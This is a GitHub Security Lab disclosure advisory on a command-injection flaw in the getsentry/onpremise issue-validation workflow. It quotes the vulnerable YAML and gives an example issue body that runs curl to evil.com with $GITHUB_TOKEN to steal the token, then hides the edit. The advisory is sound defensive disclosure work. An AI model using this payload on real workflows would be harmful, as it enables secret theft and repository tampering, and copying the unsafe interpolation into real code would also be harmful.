<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-010: Command injection in getsentry/onpremise workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-01-18: Report sent to maintainers.</li>
  <li>2021-01-19: Issue resolved.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/getsentry/onpremise/blob/master/.github/workflows/validate-new-issue.yml">validate-new-issue.yml</a> GitHub workflow is vulnerable to unauthorized modification of the base repository or secrets exfiltration.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/getsentry/onpremise">getsentry/onpremise GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest changeset <a href="https://github.com/getsentry/onpremise/blob/2e3ad5df88610ea0d329c93e2ec7a1f9655a7ef6/.github/workflows/validate-new-issue.yml">validate-new-issue.yml</a> to the date.</p>

<h2 id="details">Details</h2>

<h3 id="issue-issue-body-is-used-to-format-a-shell-command">Issue: Issue body is used to format a shell command</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">issues</span><span class="pi">:</span>
    <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">opened'</span><span class="pi">]</span>
<span class="nn">...</span>
      <span class="na">env</span><span class="pi">:</span>
        <span class="na">GITHUB_TOKEN</span><span class="pi">:</span> <span class="s">${{ github.token }}</span>
      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s"># Trust users who belong to the getsentry org.</span>
        <span class="s">if gh api "https://api.github.com/orgs/getsentry/members/${{ github.actor }}" &gt;/dev/null 2&gt;&amp;1; then</span>
          <span class="s">echo "Skipping validation, because ${{ github.actor }} is a member of the getsentry org."</span>
          <span class="s">exit 0</span>
        <span class="s">else</span>
          <span class="s">echo "${{ github.actor }} is not a member of the getsentry org. 🧐"</span>
        <span class="s">fi</span>
        <span class="s"># Look for a template where the headings match this issue's</span>
        <span class="s">echo "${{ github.event.issue.body }}" &gt; issue-body</span>
<span class="s">...</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script which allows for unauthorized modification of the base repository and secrets exfiltration. For example a user may create an issue with the title <code class="language-plaintext highlighter-rouge">It doesn't work on my machine</code> and body <code class="language-plaintext highlighter-rouge">`curl http://evil.com?$GITHUB_TOKEN`</code> which will exfiltrate the repository token capable to to modify the repository to the attacker controlled server. To make the attack less visible an attacker may modify the body of the issue to <code class="language-plaintext highlighter-rouge">Never mind my bad.</code> and close it.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-010</code> in any communication regarding this issue.</p>

